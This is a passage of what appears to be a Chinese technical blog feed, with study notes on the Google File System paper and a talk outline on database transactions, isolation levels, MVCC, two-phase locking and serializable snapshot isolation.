<p>出于此，Client并不需要和Master节点进行文件数据的传输，而是和 Chunkserver 进行数据传输。</p>
<p>Client 如何读取数据？</p>
<ol>
<li>客户端将需要读取的数据所处的文件名、偏移量转换为 chunk index（例如，需要的数据位于该文件的第几块上）</li>
<li>Client 与 Master 通信，发送file name 与 chunk index</li>
<li>Master查出文件的句柄（ chunk handle）与该文件所处的节点（location）并返回给Client</li>
<li>同一个文件所处的location可能有多个，Client自行选择一个replicas（通常是最近的）；此外，Client通常会缓存Master返回的这些信息，以便后续减少对Master的频繁请求</li>
<li>Client 向 chunkserver 发送请求，并获得返回的文件数据。</li>
</ol>
<p>后续Client对于相同的块的请求就可以从缓存中直接获取文件的存储节点，也就不需要向Master请求了。</p>
<p>此外，Client往往会在第二步中请求多个额外块的信息，这些额外信息实际上不会额外占用带宽，但是可以减少后续的C-M请求。</p>
<h3 id="Chunk-Size"><a href="#Chunk-Size" class="headerlink" title="Chunk Size"></a>Chunk Size</h3><p>块的大小是关键的设计参数之一。我们选择了64MB，这个尺寸远远大于通常文件系统的块大小。每个块副本都以普通Linux文件的形式保存在Chunkserver上。</p>
<p>大尺寸块有几个重要的优势。</p>
<ol>
<li>它减少了客户端和master交互的需求，因为对同一块的读写只需要一次和mater的初始请求来获取块的位置信息。这种缩减我们的工作负载至关重要，因为应用程序大都是连续读写大文件。即使是小规模的随机读取，客户端可以轻松地为一个数TB的工作集缓存所有的块位置信息。</li>
<li>因为采用较大块，客户端很可能对一个块执行多次操作，这样可以通过与Chunkserver在很长的时间内保持持久的TCP 连接来减少网络负载。</li>
<li>它减少了在master上保存的元数据的大小。这就允许我们把元数据保存在内存中，这也带来了其它优势，我们将在在2.6.1节进行讨论。</li>
</ol>
<p>另一方面，即使配合惰性空间分配，大尺寸块也有其缺点。</p>
<ol>
<li>小文件包含少量的块，甚至只有一个块。如果许多客户端访问同一个小文件，存储这些块的Chunkserver就会变成热点。在实际中，由于我们的程序通常是连续的读取包含多个块的大文件，热点还不是主要问题。</li>
<li>然而，当GFS第一次被批处理队列系统使用的时候，热点问题还是显露了：一个可执行文件作为一个单块文件写在了GFS上，之后同时在数百台机器上启动。存放这个可执行文件的几个Chunkserver被数百个并发请求造成过载。我们通过使用更大的复制因子来保存这样的可执行文件，并且让批处理队列系统错开程序的启动时间的方法解决了这个问题。一个可能的长效解决方案是，在这种的情况下允许客户端从其它客户端读取数据（p2p?）。</li>
</ol>
<h3 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h3><p>Master会存储三种类型的元数据：</p>
<ol>
<li>文件与块的命名空间</li>
<li>文件名 ~ 块的映射关系</li>
<li>每个块的副本的存放位置（location）</li>
</ol>
<p>这三种数据是存放在Master的内存之中，但是前两者会使用log的方式进行持久化并备份。这使得Master在崩溃后可以恢复工作。而具体的块副本的位置并不会持久化，在Master启动、Chunkserver加入集群时，Chunkserver会主动向Master提供自己所拥有的块信息。</p>
<h4 id="In-Memory"><a href="#In-Memory" class="headerlink" title="In-Memory"></a>In-Memory</h4><p>元数据保存在内存之中，因此Master的操作速度非常之快。Master还会在后台周期性地扫描当前的集群状态，扫描结果将会被用于垃圾收集、Chunkserver的失效备份，以及负载均衡、块迁移等。4.3和4.4章节将进一步讨论这些行为。</p>
<p>将元数据存放在内存中的潜在问题在于：内存的上限导致了块数量存在上限。但实际中问题并不严重，每个块需要的元数据并不大（通常少于64字节）而且，相比于内存存储所带来的简洁性、可靠性、高性能和灵活性而言，针对Master的内存硬件开销是值得的。</p>
<h4 id="Chunk-Locations"><a href="#Chunk-Locations" class="headerlink" title="Chunk Locations"></a>Chunk Locations</h4><p>前面说过，Master并不会将Chunk Locations 进行持久化记录，而是在启动时轮询chunkservers 来获取这些信息。由于Master本身也需要对chunkservers 进行心跳检测，所以是可以保持Chunk Locations 始终处于最新状态。</p>
<p>不持久化该信息是出于以下的考量：在chunkservers 加入、离开集群、更名、失效、重启时，需要与Master保持同步Chunk Locations。在节点较多的集群中，类似的事情发送地非常频繁与费时。此外，Chunk Locations 应当由chunkservers 自己说了算，自行处理各类问题并向Master负责。Master就不应该试图保留Chunk Locations 。</p>
<h4 id="Operation-Log"><a href="#Operation-Log" class="headerlink" title="Operation Log"></a>Operation Log</h4><p>操作日志包含了元数据变更历史记录。它也作为定义同步操作顺序的逻辑时间基线，类似数据库的多版本管理。</p>
<p>与其他的日志系统似乎没啥大区别，略。</p>
<h3 id="Consistency-Model"><a href="#Consistency-Model" class="headerlink" title="Consistency Model"></a>Consistency Model</h3><p>GFS提供了一个宽松的一致性模型，这个模型很好地支撑我们的高度分布的应用，但是也不会由于较强的一致性限制拖慢系统。</p>
<h4 id="Guaranteesby-GFS"><a href="#Guaranteesby-GFS" class="headerlink" title="Guaranteesby GFS"></a>Guaranteesby GFS</h4><p>妈的，看不懂</p>
<h2 id="SYSTEM-INTERACTIONS"><a href="#SYSTEM-INTERACTIONS" class="headerlink" title="SYSTEM INTERACTIONS"></a>SYSTEM INTERACTIONS</h2><p>系统力图最小化master与所有操作的牵连。在这样的背景下描述客户机、master和Chunkserver如何交互以实现数据变更、原子记录追加以及快照功能。</p>
<h4 id="Leases-and-Mutation-Order"><a href="#Leases-and-Mutation-Order" class="headerlink" title="Leases and Mutation Order"></a>Leases and Mutation Order</h4><p>变更是改变块内容或者块元数据的操作，包括写操作或者追加操作。由于每个块的信息时冗余存储在不同的副本上，因此每次变更将在块所有的副本上执行。</p>
<p>租约（Lease）被用于维护副本间的一致性变更顺序。Master向其中一个副本授权一个块租约，我们把这个副本叫做主副本。再由主副本自主决定数据变更的序列顺序。</p>
<p>租约的初始过期时间为60秒。然而主副本可以请求并且通常会得到master无限期的延长。这些延长请求和批准信息附在定期交换的心跳消息中。</p>
<p>租约的时效性可以保证，即使master和主副本失去联系，它仍然可以安全地在旧的租约到期后和向另外一个副本授权新的租约。</p>
<p>​                 <img src="https://docimg1.docs.qq.com/image/Xe34y71yT3nNwRRWkdZ3Xg?w=565&amp;h=501" alt="img">        </p>
<ol>
<li>客户机询问master哪一个Chunkserver持有该块当前的租约，以及其它副本的位置。如果没有chunkserver持有租约，master将先把租约授权给Master选择的副本。</li>
<li>master将主副本的标识符以及其它副本（称为次级副本secondary）的位置返回给客户机。客户机为将来的变更缓存这些元数据，直到租约过期或主副本不可达。</li>
<li>客户机将需要更改的数据推送到所有的副本中，但是此时并没有正式写入，推送的数据将会缓存在Chunkserver中。</li>
<li>当所有的副本都确认接收到刚才推送的更改数据后，Client会向主副本发送写请求。主副本可能会同时受到多个client的并发写请求，它自行决定如何将这些更改请求序列化，并顺序执行这些操作并更新自己的状态。</li>
<li>Primary将写请求转发到secondary中，每个secondary都将根据primary分配的序列顺序来变更数据。</li>
<li>所有次级副本回复主副本并标明它们已经完成了操作。</li>
<li>主副本回复客户机。</li>
</ol>
<p>这期间，任何副本遇到的任何错误都报告给客户机。出错的情况下，写操作可能在主副本和次级副本的任意子集上执行成功。（如果在主副本失败，就不会分配序列号和转发。）客户端请求被认定为失败，被修改的域处于不一致的状态。我们的客户机代码通过重试失败的变更来处理这样的错误。在退到从头开始重试之前，客户机会将从步骤（3）到步骤（7）做几次尝试。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>乘龙术</category>
        <category>分布式系统</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT6.824</tag>
      </tags>
  </entry>
  <entry>
    <title>分享讲座_事务与隔离性</title>
    <url>/2021/06/03/%E5%88%86%E4%BA%AB%E8%AE%B2%E5%BA%A7-%E4%BA%8B%E5%8A%A1%E4%B8%8E%E9%9A%94%E7%A6%BB%E6%80%A7/</url>
    <content><![CDATA[<p>这是在工作室与大家分享的关于事务与隔离性的一篇文章。</p>
<a id="more"></a>
<h2 id="Content"><a href="#Content" class="headerlink" title="Content"></a>Content</h2><ul>
<li><p>回顾 ACID</p>
</li>
<li><ul>
<li>原子性：中止与回滚；简化出错处理；不保证并发；</li>
<li>一致性：歧义；数据某种约束；应用层职责</li>
<li>隔离性：模拟串行化；弱隔离性</li>
<li>持久性：不存在完美的持久880</li>
</ul>
</li>
<li><p>开胃菜</p>
</li>
<li><ul>
<li>脏读：邮箱问题</li>
<li>更新丢失：递增计数器问题</li>
</ul>
</li>
<li><p>几种弱隔离级别：</p>
</li>
<li><ul>
<li><p>读提交</p>
</li>
<li><ul>
<li>脏读与脏写</li>
<li>实现：行级锁/两版本</li>
<li>依旧存在的问题：读倾斜</li>
</ul>
</li>
<li><p>快照隔离</p>
</li>
<li><ul>
<li>一致性快照；读写不干扰；</li>
<li>实现：MVCC</li>
<li>更新丢失</li>
</ul>
</li>
</ul>
</li>
<li><p>可串行化它不香吗</p>
</li>
<li><ul>
<li><p>幻读与写倾斜</p>
</li>
<li><p>隔离级别的弊病</p>
</li>
<li><p>三种实现技术</p>
</li>
<li><ul>
<li><p>严格串行化</p>
</li>
<li><ul>
<li>可行性</li>
</ul>
</li>
<li><p>两阶段加锁（悲观锁）</p>
</li>
<li><ul>
<li>写写互斥、读写互斥；读写锁；</li>
<li>死锁与性能</li>
<li>幻读：表级锁与区间锁</li>
</ul>
</li>
<li><p>可串行化的快照隔离（乐观锁）</p>
</li>
<li><ul>
<li>基于快照隔离</li>
<li>提交前检查冲突</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="回顾-ACID"><a href="#回顾-ACID" class="headerlink" title="回顾 ACID"></a>回顾 ACID</h2><h3 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h3><p>什么是原子？原子就是不可继续分割的东西。</p>
<p>在计算机的不同讨论范畴内，这个词拥有不同的内涵。例如，当我们讨论 原子操作 的时候，这表明线程  Bob  是无法看到线程 A 的操作的中间态的——要么操作之前，要么操作之后。</p>
<p>但是在 ACID 中，原子性并不涉及到并发性。原子性表示这种可能性是可能存在的：可能有两个原子同时在执行，而它们之间也许可能看到彼此的中间状态。事实上，这是隔离性的职责。</p>
<p>原子性提供的保证是：事务要么成功，要么失败。</p>
<p>如果成功，那么成功；</p>
<p>如果失败，那么中止并回滚。</p>
<p>原子性的意义在于，当出现问题时，上层应用并不需要考虑 “恢复现场” 的行为；但是它本身并 不提供任何能够防止问题出现 的帮助。</p>
<h3 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h3><p>一致性这个词汇的歧义更大。例如，我们在谈论 “CAP” 时，是指 对某个指定的客户端来说，读操作能返回最新的写操作。而在我们 ACID 这里，一致性是指，数据处于某种被约束好的一致状态下。</p>
<p>关于一致性的歧义问题可以参考：<a href="https://juejin.cn/post/6844903782329876494#heading-2" target="_blank" rel="noopener">谈谈数据一致性</a></p>
<p>举个栗子：</p>
<p>银行账户中，Alice 账户中有￥114014，Bob 账户中有￥500。Alice 转100元给 Bob ，Alice 扣减100， Bob 加上100。在事务开始前和事务完成之后都能保证他们的帐是对上的，都是满足 “A + B = 114514” 这个约束。</p>
<p>但是在事务过程中有可能会出现Alice 扣减了100元， Bob 没有加上100元的情况，这就是不一致，不再满足 “A + B = 114514” 这个约束。</p>
<p>当然，如果出现这种情况下，应该是被认为事务失败、触发原子性、进行中止并回滚。这是原子性的职责了。</p>
<p>严格来说，一致性这个职责本质上来说不应该是数据库背的锅。类似账户之和为定值这种数据之间存在的依赖关系应当是应用层负责的业务逻辑 。而事实上，ACID中的C其实最开始是为了顺口而加上的。</p>
<h3 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h3><p>原子性并不考虑多个原子（也就是事务）并发执行下可能出现的问题，隔离性来考虑这些。</p>
<p>隔离性的职责是：在多个事务并发执行的情况下，将其互相隔离，使最终结果就像这些事务串行化执行一样。</p>
<p>我们在这里不展开讲了，毕竟后面全都是在展开这玩意。</p>
<h3 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h3><p>如果事务一旦提交成功，那么无论发生什么，数据总不会消失。</p>
<p>很显然，完美的持久性是不存在的——没准下一秒银河系超空间计划委员会跑过来说由于修建超空间快速通道的行政规划需要毁灭地球呢。我们只是能够防范普通的问题：例如数据库崩溃或者硬件故障等。</p>
<h2 id="开胃菜"><a href="#开胃菜" class="headerlink" title="开胃菜"></a>开胃菜</h2><p>下面我们回归到隔离性，先来两个开胃菜，看看如果没有隔离性（或者隔离性较弱）的情况下会发生什么。</p>
<p>在此之前，请先暂时忘掉你们所知道的各种并发处理措施，我们一点点开始。</p>
<ol>
<li><h3 id="脏读：邮箱问题"><a href="#脏读：邮箱问题" class="headerlink" title="脏读：邮箱问题"></a>脏读：邮箱问题</h3></li>
</ol>
<p>一个邮箱系统为了方便，在显眼处统计了“未读消息”。</p>
<p>​                 <img src="https://docimg1.docs.qq.com/image/b9ou2YD54CagEHW6Vd_aGA?w=700&amp;h=293" alt="img">        </p>
<p>​                 <img src="https://docimg7.docs.qq.com/image/-0LkhUHLNBQFdaKo93e6Xg?w=1124&amp;h=468" alt="img">        </p>
<p>在这里，User 2 在 U1 的两次写入之间读取了信息。这使得 User 2 很困惑：为什么我的邮箱列表中存在未读邮件（count(emails) != 0），而未读邮件数（mailbox.unread）是0呢？</p>
<p>脏读：读到未被提交的写入。</p>
<p>在这里，U1 的两次写入应当是属于同一个事务，而 U2 却在事务未提交时，读取了事务的中间状态。这是隔离性不允许的。</p>
<p>我们会在稍后看到如何解决这个问题。</p>
<ol>
<li><h3 id="更新丢失：递增计数器"><a href="#更新丢失：递增计数器" class="headerlink" title="更新丢失：递增计数器"></a>更新丢失：递增计数器</h3></li>
</ol>
<p>有一个递增计数器，它的工作是：从数据库中读取一个数据，加一，然后写入数据库。</p>
<p>​                 <img src="https://docimg4.docs.qq.com/image/0MXhkJhRUgr9ieVQhvaeVw?w=1124&amp;h=352" alt="img">        </p>
<p>在这里，两个递增操作进行完毕后，数据竟然是 42 -&gt; 43 ！</p>
<p>这显然是隔离性上的问题。还记得隔离性的职责吗？将并发的结果好像是串行化一样，43肯定不是串行化得到的结果，44才是。</p>
<p>如何解决更新丢失其实是个很困难的工作。我们会在很后面遇到它，希望我们时间够用。</p>
<p>这是就有同学问了，既然隔离性的目的是去模拟串行化，为什么不直接进行串行化呢？</p>
<p>这个问题很有意思，标准回答是，串行化太慢了，就像你天天上班摸鱼老板肯定要多找几个实习生来卷你。性能是非常非常非常重要的，想一想，你作为底层的数据库都这么摸的话，再经过应用的各种业务逻辑处理的放大，用户可谓是一秒一卡，十分潇洒，五步一停，不服不行。</p>
<p>所以聪明的人们想出了各种方法来优化隔离性，并将之称为弱隔离级别。这些隔离级别可以防止部分并发问题，但不能防范全部。由于并发问题其实是个概率问题，而众所周知概率一向是玄不救非氪不改命，有些人认为一些应用中并不需要过于在意偶尔出现的并发问题，加上性能优势，它们还是被广泛使用。</p>
<p>但是更有意思的事情是，随着我们接下来的讨论，我们会发现各种隔离级别是如此难以理解。弱隔离级别是工业界妥协的产物，于是后来又有人觉得，去tmd弱隔离，串行化真香！</p>
<p>接下来，我们会讨论读-提交，快照隔离与可串行化。这些隔离级别逐步增强，可串行化已经能够解决所有的并发问题了。</p>
<p>我们将会讨论下面这些并发问题：脏读、脏写；读倾斜、更新丢失；写倾斜、幻读；</p>
<p>我们将会讨论下面这些隔离实现：行级锁、MVCC、两阶段加锁、可串行化快照隔离。</p>
<p>希望时间够用：）</p>
<h2 id="弱隔离级别"><a href="#弱隔离级别" class="headerlink" title="弱隔离级别"></a>弱隔离级别</h2><h3 id="读-提交（Read-Committed）"><a href="#读-提交（Read-Committed）" class="headerlink" title="读-提交（Read Committed）"></a>读-提交（Read Committed）</h3><ol>
<li>从数据库读时，只能看到已提交的数据（没有脏读（dirty reads））</li>
<li>写入数据库时，只会覆盖已经写入的数据（没有脏写（dirty writes））</li>
</ol>
<h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><p>设想一个事务 A 已经将一些数据写入数据库，但事务A还没有提交或中止。另一个事务B可以看到未提交的数据吗？如果可以，那么这种并发问题就称之为脏读。</p>
<p>脏读的一个例子我们已经在前面举过了。另外一种情况是，如果 B 将读到的数据返回给应用，但是A最后出问题了，没提交成功而是回滚了。B 的数据将是无中生有出来的，所以说，不要见着风是得雨。假使这些完全无中生有的东西，B帮A上传给应用了，等于 —— B 也有责任吧？！</p>
<p>我们举一个脏写的例子。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>事务A</th>
<th>事务B</th>
<th>数据库</th>
</tr>
</thead>
<tbody>
<tr>
<td>begin transaction</td>
<td>begin transaction</td>
<td>x = 0</td>
</tr>
<tr>
<td>write( x = 1 )</td>
<td></td>
<td>ok! x = 1</td>
</tr>
<tr>
<td></td>
<td>write( x = 2)</td>
<td>ok! x = 2</td>
</tr>
<tr>
<td>No, I want roll back it….</td>
<td></td>
<td>ok! x = 0</td>
</tr>
<tr>
<td></td>
<td>commit</td>
<td>ok!</td>
</tr>
<tr>
<td></td>
<td>Let me read x…</td>
<td>ok! x = 0</td>
</tr>
</tbody>
</table>
</div>
<p>事务B：WTF？</p>
<p>这个例子重点在于，rollback 操作将事务 B 的未提交的写入覆盖成 0 了。</p>
<p>另外需要注意的是：更新丢失并不是脏写的一种，可以结合下面自己理解，下面这种情况是更新丢失，但不是脏写。准确的说法是，脏xie和更新丢失有一些交集。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>事务A</th>
<th>事务B</th>
<th>数据库</th>
</tr>
</thead>
<tbody>
<tr>
<td>begin transaction</td>
<td>begin transaction</td>
<td>x = 42</td>
</tr>
<tr>
<td>read(x)</td>
<td></td>
<td>ok! x = 42</td>
</tr>
<tr>
<td></td>
<td>read(x)</td>
<td>ok! x = 42</td>
</tr>
<tr>
<td>y = x + 1</td>
<td>z = x + 1</td>
<td></td>
</tr>
<tr>
<td>write(x = y)</td>
<td></td>
<td>ok! x = y = 43</td>
</tr>
<tr>
<td>commit</td>
<td></td>
<td>ok!</td>
</tr>
<tr>
<td></td>
<td>write(x = z)</td>
<td>ok! x = z = 43</td>
</tr>
<tr>
<td></td>
<td>commit</td>
<td>ok!</td>
</tr>
</tbody>
</table>
</div>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>最常见的情况是，数据库通过使用行锁（row-level lock） 来防止脏写：</p>
<p>当事务想要修改特定对象（行或文档）时，它必须首先获得该对象的锁。然后必须持有该锁直到事务被提交或中止。</p>
<p>一次只有一个事务可持有任何给定对象的锁；如果另一个事务要写入同一个对象，则必须等到第一个事务提交或中止后，才能获取该锁并继续。</p>
<p>那么脏读呢？</p>
<p>一种方式是使用相同的锁，并要求任何想要读取对象的事务来简单地获取该锁，然后在读取之后立即再次释放该锁。</p>
<p>但是要求读锁的办法在实践中效果并不好。因为一个长时间运行的写入事务会迫使许多只读事务等到这个慢写入事务完成。</p>
<p>脏读的另外一种解决方式是使用两个版本的数据。对于写入的每个对象，数据库都会记住旧的已提交值，和由当前持有写入锁的事务设置的新值。 当事务正在进行时，任何其他读取对象的事务都会拿到旧值。 只有当新值提交后，事务才会切换到读取新值。我喜欢把这个处理办法叫做 迷你的快照隔离（并非官方称呼，只是我喜欢）</p>
<p>也许有人会考虑读锁与写锁，那是个很棒的主意，但是我们会在最最后面谈论它了。在这里，读与写操作使用的是相同的锁。</p>
<h4 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h4><p>读-提交 依旧存在一些无法解决的并发问题。例如最开始的版本更新问题。我们下面介绍另外一种它无法处理的问题，称为 读倾斜（read skew），又名 不可重复读（nonrepeatable read）。</p>
<p>Alice 拥有两个账户，每个账户 500 元。现在另外一个人试图从账户1中转100块到账户2上（这是一个事务）。Alice 同时在查询自己的余额（这是另一个事务）。她发现自己账户2消失了一百块！</p>
<p>​                 <img src="https://docimg4.docs.qq.com/image/BaWjd10ugyetbS27PlQqMg?w=1120&amp;h=524" alt="img">        </p>
<p>需要注意，这个case并不违背读-提交。A 的两次read均没有读到未提交的数据。但是就是出问题了呢？</p>
<p>是的，Alice 只需要稍后再查一遍账户1就会发现其实没有问题，也就是说之前的读的结果是不可重复的。这里并不是个大问题。但是在另外一些情况下，这种暂时性的不一致也是不能容忍的。</p>
<p>例如，备份。你不能为了备份就强行停掉数据库的业务能力，但是如何保证数据库在备份过程中（可能持续几小时）不被类似的情况干扰呢？</p>
<p>也许，我们需要一种方式，能够在瞬间给整个数据库拍个照片。备份操作基于照片，而业务操作继续正常运行。</p>
<p>是的，这种照片被称为快照。</p>
<h3 id="快照隔离"><a href="#快照隔离" class="headerlink" title="快照隔离"></a>快照隔离</h3><p>快照隔离的口号是：读写分离。或者是读不阻塞写，写不阻塞读。</p>
<p>MVCC 的思路和上面的拍照片的比喻还不太一样：比喻中，我们只在备份前拍照，而实际上，我们随时随地都在拍照。或者说，我们拥有时间轴上的数据库的每个时刻的切片，我们根据需要访问。（当然这个切片不会把原子切开）</p>
<p>每个事务都从数据库的一致快照（consistent snapshot） 中读取——也就是说，事务可以看到事务开始时在数据库中提交的所有数据。即使这些数据随后被另一个事务更改，每个事务也只能看到该特定时间点的旧数据。</p>
<p>我们直接来看吧。</p>
<ul>
<li><p>当一个事务开始时，它被赋予一个唯一的，永远增长的事务ID。</p>
</li>
<li><p>当事务向数据库写入（插入删除更新）任何内容时，它所写入的数据都会被标记上写入者的事务ID。</p>
</li>
<li><p>当事务读取某行：</p>
</li>
<li><ul>
<li>事务开始时，数据库列出当时所有其他（尚未提交或中止）的事务清单，即使之后提交了，这些事务的写入也都会被忽略。</li>
<li>被中止事务所执行的任何写入都将被忽略。</li>
<li>由具有较晚事务ID（即，在当前事务开始之后开始的）的事务所做的任何写入都被忽略，而不管这些事务是否已经提交。</li>
<li>所有其他写入，对应用都是可见的。</li>
</ul>
</li>
</ul>
<p>粗糙理解：在事务开始时拍个照，然后只看照片。</p>
<p>拓展：有没有什么情况下是看最新值呢？有的，这被称为当前读。而上面说的过程被称为快照读。这里就不展开了。参考链接：<a href="https://www.ouyym.com/wen/20383/" target="_blank" rel="noopener">MVCC多版本并发控制</a></p>
<h3 id="更新丢失"><a href="#更新丢失" class="headerlink" title="更新丢失"></a>更新丢失</h3><p>快照隔离隔离了读与写，规避了在并发情况下的读写冲突。但是并不能解决写-写的并发问题。解决写写的并发问题有多种可行的解决方案。</p>
<h4 id="原子写操作"><a href="#原子写操作" class="headerlink" title="原子写操作"></a>原子写操作</h4><p>如果数据库系统提供了原子更新操作，那么可以在数据库中原子地更新数据。数据库层面保证它们是并发安全的。例如 Redis 中某些特定的数据结构的操作。</p>
<h4 id="显式加锁"><a href="#显式加锁" class="headerlink" title="显式加锁"></a>显式加锁</h4><p>在应用层面显式加锁来解决这个问题。又被称为悲观锁。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT  FROM xxx </span><br><span class="line">    WHERE ...</span><br><span class="line">    FOR UPDATE;    &#x2F;&#x2F; 注意这个FOR UPDATE</span><br><span class="line">UPDATE xxx ...;</span><br></pre></td></tr></table></figure>
<h4 id="自动检测更新丢失"><a href="#自动检测更新丢失" class="headerlink" title="自动检测更新丢失"></a>自动检测更新丢失</h4><p>原子操作和锁是通过强制读取-修改-写入序列按顺序发生，来防止丢失更新的方法。另一种方法是允许它们并行执行，如果事务管理器检测到丢失更新，则中止事务并强制它们重试其读取-修改-写入序列。又被称作乐观锁。</p>
<p>这种方法的一个优点是，数据库可以结合快照隔离高效地执行此检查。但是，MySQL/InnoDB的可重复读并不会检测丢失更新。一些人认为，数据库必须能防止丢失更新才称得上是提供了快照隔离，所以在这个定义下，MySQL下不提供快照隔离。</p>
<h4 id="原子比较和设置（CAS）等"><a href="#原子比较和设置（CAS）等" class="headerlink" title="原子比较和设置（CAS）等"></a>原子比较和设置（CAS）等</h4><p>略</p>
<h2 id="串行化"><a href="#串行化" class="headerlink" title="串行化"></a>串行化</h2><p>上一小节的各种操作依旧不能完全解决并发问题。存在写倾斜：</p>
<p>例如，预定会议室之前需要先检查会议室是否被预定，然后发出预定请求。当A和B分别预定会议室R时，他们同时去检查了会议室预定表，发现没有房间R在那段时间的记录，然后都预订了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOK_TABLE (room_id, date, start_time, end_time, username)</span><br></pre></td></tr></table></figure>
<p>写倾斜的实质是：</p>
<ol>
<li>应用通过SELECT语句，匹配出一些特定条件的记录。</li>
<li>根据匹配结果，应用层代码来确定下一步的操作（是预定还是返回已占用的错误）</li>
<li>如果应用层继续执行，那么它将进行数据库的写入操作</li>
</ol>
<p>但是，第三步的数据库写入操作将会改变第一步的匹配结果，进而影响第二步的判断结果。在并发时，不同的事务之间就会影响对方。</p>
<p>一个很自然的想法是加锁，但是：并不存在加锁的客体。注意是根据记录表种的记录来判断这个时间段的房子是否被占用，你没有办法将一个不存在的记录加锁。</p>
<p>由加锁延伸出的解决方案是，将所有房间与时间段进行排列组合，然后对结果进行加锁。这种解决方式被称为实体化冲突。但是，为了一个应用层的小需求大幅度改变数据库的底层设计是不好的，相比之下更推荐使用串行化的处理。</p>
<p>与写倾斜类似的一个并发问题被称为幻读。他们的是出现原因是相同的：一个事务的写入改变了另外一个事务的查询结果。</p>
<h3 id="隔离级别的弊病"><a href="#隔离级别的弊病" class="headerlink" title="隔离级别的弊病"></a>隔离级别的弊病</h3><ul>
<li>隔离级别难以理解，并且在不同的数据库中实现的不一致（例如，“可重复读”的含义天差地别）。</li>
<li>光检查应用代码很难判断在特定的隔离级别运行是否安全。 特别是在大型应用程序中，您可能并不知道并发发生的所有事情。</li>
<li>没有检测竞争条件的好工具。原则上来说，静态分析可能会有帮助，但研究中的技术还没法实际应用。并发问题的测试是很难的，因为它们通常是非确定性的 —— 只有在倒霉的时机下才会出现问题。</li>
</ul>
<h3 id="三种实现"><a href="#三种实现" class="headerlink" title="三种实现"></a>三种实现</h3><h4 id="严格串行化"><a href="#严格串行化" class="headerlink" title="严格串行化"></a>严格串行化</h4><p>可行性</p>
<p>内存足够便宜了，许多场景现在都可以将完整的活跃数据集保存在内存中。当事务需要访问的所有数据都在内存中时，事务处理的执行速度要比等待数据从磁盘加载时快得多。</p>
<p>数据库设计人员意识到OLTP事务通常很短，而且只进行少量的读写操作.相比之下，长时间运行的分析查询通常是只读的，因此它们可以在串行执行循环之外的一致快照（使用快照隔离）上运行。</p>
<h4 id="两阶段加锁（悲观锁）"><a href="#两阶段加锁（悲观锁）" class="headerlink" title="两阶段加锁（悲观锁）"></a>两阶段加锁（悲观锁）</h4><p>之前我们看到锁通常用于防止脏写：如果两个事务同时尝试写入同一个对象，则锁可确保第二个写入必须等到第一个写入完成事务（中止或提交），然后才能继续。</p>
<p>在那个时候，我们的读与写都是使用的同样的锁。但是——正如大家在数据库课上学的一样——我们接下来使用了两种不同的锁。别称为两阶段锁定（2PL，two-phase locking ）</p>
<p>两阶段锁定类似，但使锁的要求更强。只要没有写入，就允许多个事务同时读取同一个对象。但对象只要有写入（修改或删除），就需要独占访问（exclusive access） 权限。</p>
<p>写写互斥、读写互斥</p>
<p>2PL 怎么解决前面的写倾斜问题呢？</p>
<ul>
<li>A在查询某一时间段的房间预定情况时，会把这个时间段的记录加上读锁。如果此时B拥有写锁，那么A将会等待；</li>
<li>A在试图写入时，需要将自己的读锁升级为写锁。检查是否由其他事务正在使用读锁，如果有，那么A等待。</li>
</ul>
<p>等等，刚才的问题在于，怎么给一个不存在的记录上锁？我们引进了 谓词锁。它能够作用于某一些满足条件的查询对象。</p>
<p>此外，索引区间锁是大多数数据库采用的，它是谓词锁的近似版本，但是提高性能。</p>
<p>2PL 的严重问题在于，性能太慢了，而且死锁的出现相当频繁。</p>
<h4 id="可串行化的快照隔离（乐观锁）"><a href="#可串行化的快照隔离（乐观锁）" class="headerlink" title="可串行化的快照隔离（乐观锁）"></a>可串行化的快照隔离（乐观锁）</h4><p>一方面，我们实现了性能不好（2PL）或者扩展性不好（串行执行）的可序列化隔离级别。另一方面，我们有性能良好的弱隔离级别，但容易出现各种竞争条件（丢失更新，写入偏差，幻读等）。数据库中并发控制似乎前途黯淡。</p>
<p>但是，2008年提出了一种称为 可串行化的快照隔离 （SSI, serializable snapshot isolation） 的技术，提供了完整的可串行化保证，同时兼顾效率。</p>
<p>两阶段锁是一种所谓的悲观并发控制机制（pessimistic） ：如果有事情可能出错（如另一个事务所持有的锁所表示的），最好等到情况安全后再做任何事情。</p>
<p>从某种意义上说，串行执行可以称为悲观到了极致：在事务持续期间，每个事务对整个数据库（或数据库的一个分区）具有排它锁，作为对悲观的补偿，我们让每笔事务执行得非常快，所以只需要短时间持有“锁”。</p>
<p>相比之下，序列化快照隔离是一种乐观（optimistic） 的并发控制技术。在这种情况下，乐观意味着，如果存在潜在的危险也不阻止事务，而是继续执行事务，希望一切都会好起来。当一个事务想要提交时，数据库检查是否有什么不好的事情发生（即隔离是否被违反）；如果是的话，事务将被中止，并且必须重试。只有可序列化的事务才被允许提交。</p>
<p>顾名思义，SSI基于快照隔离——也就是说，事务中的所有读取都是来自数据库的一致性快照。在快照隔离的基础上，SSI添加了一种算法来检测写入之间的序列化冲突，并确定要中止哪些事务。</p>
<p>回顾一下写倾斜。它的问题在于，当我们在读取数据时，无法得知这些数据是否会与随后的写事务由因果关系。SSI 需要试图检测出这种可能性。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>事务的意义在于：将数据库封装好，并且简化或者完全消除开发者对于并发的处理。</p>
